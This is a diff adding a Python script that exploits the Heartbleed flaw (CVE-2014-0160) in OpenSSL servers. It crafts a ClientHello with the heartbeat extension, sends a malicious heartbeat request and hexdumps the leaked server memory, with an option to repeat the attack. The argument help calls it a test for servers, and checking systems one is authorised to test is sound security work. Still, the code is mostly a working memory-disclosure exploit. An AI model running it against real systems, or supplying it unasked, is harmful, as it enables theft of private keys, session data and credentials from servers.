@@ -1,0 +1,141 @@
+#!/usr/bin/env python
+# Exploitation of CVE-2014-0160 Heartbeat for the server
+# Author: Peter Wu <peter@lekensteyn.nl>
+# Licensed under the MIT license <http://opensource.org/licenses/MIT>.
+
+import socket
+import sys
+import struct
+import time
+from argparse import ArgumentParser
+
+# Hexdump etc
+from pacemaker import hexdump, make_heartbeat, read_record, read_hb_response
+from pacemaker import Failure
+
+parser = ArgumentParser(description='Test servers for Heartbleed (CVE-2014-0160)')
+parser.add_argument('host', help='Hostname to connect to')
+parser.add_argument('-6', '--ipv6', action='store_true',
+        help='Enable IPv6 addresses (implied by IPv6 listen addr. such as ::)')
+parser.add_argument('-p', '--port', type=int, default=443,
+        help='TCP port to connect to (default %(default)d)')
+parser.add_argument('-t', '--timeout', type=int, default=3,
+        help='Timeout in seconds to wait for a Heartbeat (default %(default)d)')
+parser.add_argument('-x', '--count', type=int, default=1,
+        help='Number of Hearbeats requests to be sent (default %(default)d)')
+
+def make_clienthello(sslver='03 01'):
+    # openssl ciphers -V 'HIGH:!MD5:!PSK:!DSS:!ECDSA:!aNULL:!SRP' |
+    # awk '{gsub("0x","");print tolower($1)}' | tr ',\n' ' '
+    ciphers = '''
+    c0 30 c0 28 c0 14 00 9f 00 6b 00 39 00 88 c0 32
+    c0 2e c0 2a c0 26 c0 0f c0 05 00 9d 00 3d 00 35
+    00 84 c0 12 00 16 c0 0d c0 03 00 0a c0 2f c0 27
+    c0 13 00 9e 00 67 00 33 00 45 c0 31 c0 2d c0 29
+    c0 25 c0 0e c0 04 00 9c 00 3c 00 2f 00 41
+    '''
+    ciphers_len = len(bytearray.fromhex(ciphers.replace('\n', '')))
+
+    # Handshake type and length will be added later
+    hs = sslver
+    hs += 32 * ' 42'    # Random
+    hs += ' 00'         # SID length
+    hs += ' 00 {:02x}'.format(ciphers_len) + ciphers
+    hs += ' 01 00 '     # Compression methods (1); NULL compression
+    # Extensions length
+    hs += ' 00 05'      # Extensions length
+    # Heartbeat extension
+    hs += ' 00 0f'      # Heartbeat type
+    hs += ' 00 01'      # Length
+    hs += ' 01'         # mode (peer allowed to send requests)
+
+    hs_data = bytearray.fromhex(hs.replace('\n', ''))
+    # ClientHello (1), length 00 xx xx
+    hs_data = struct.pack('>BBH', 1, 0, len(hs_data)) + hs_data
+
+    # Content Type: Handshake (22)
+    record_data = bytearray.fromhex('16 ' + sslver)
+    record_data += struct.pack('>H', len(hs_data))
+    record_data += hs_data
+    return record_data
+
+def skip_server_handshake(sock, timeout):
+    end_time = time.time() + timeout
+    for i in range(0, 5):
+        record, error = read_record(sock, timeout)
+        timeout = end_time - time.time()
+        if not record:
+            raise Failure('Unexpected server handshake! ' + str(error))
+
+        content_type, _, fragment = record
+        # Server handshake is complete after ServerHelloDone
+        if content_type == 22 and len(fragment) == 4 and fragment[0] == 14:
+            break
+
+def handle_ssl(sock, sslver='03 01'):
+    # ClientHello
+    sock.sendall(make_clienthello(sslver))
+
+    # Skip ServerHello, Certificate, ServerKeyExchange, ServerHelloDone
+    skip_server_handshake(sock, args.timeout)
+
+    # Are you alive? Heartbeat please!
+    try:
+        sock.sendall(make_heartbeat(sslver))
+    except socker.error as e:
+        print('Unable to send heartbeat! ' + str(e))
+        return False
+
+    try:
+        memory = read_hb_response(sock, args.timeout)
+        if memory is not None and not memory:
+            print('Possibly not vulnerable')
+            return False
+        elif memory:
+            print('Server returned {0} ({0:#x}) bytes'.format(len(memory)))
+            hexdump(memory)
+    except socket.error as e:
+        print('Unable to read heartbeat response! ' + str(e))
+        return False
+
+    # "Maybe" vulnerable
+    return True
+
+def test_server(host, port, timeout, family=socket.AF_INET):
+    try:
+        try:
+            sock = socket.socket(family=family)
+            sock.connect((host, port))
+            sock.settimeout(timeout) # For writes, reads are already guarded
+        except socket.error as e:
+            print('Unable to connect to {}:{}: {}'.format(host, port, e))
+            return False
+
+        return handle_ssl(sock)
+    except (Failure, socket.error) as e:
+        print('Unable to check for vulnerability: ' + str(e))
+        return False
+    finally:
+        if sock:
+            sock.close()
+
+
+def main(args):
+    family = socket.AF_INET6 if args.ipv6 else socket.AF_INET
+
+    # OpenSSL expects a client key exchange after its ServerHello.  After the
+    # first heartbeat, it will reset the connection. That's why we cannot just
+    # repeatedly send heartbeats as the client does. For that, we need to
+    # complete the handshake, but that requires a different implementation
+    # approach. For now just keep re-connecting, it will flood server logs with
+    # handshake failures though.
+    for i in range(0, args.count):
+        if not test_server(args.host, args.port, args.timeout, family=family):
+            break
+
+if __name__ == '__main__':
+    args = parser.parse_args()
+    try:
+        main(args)
+    except KeyboardInterrupt:
+        pass
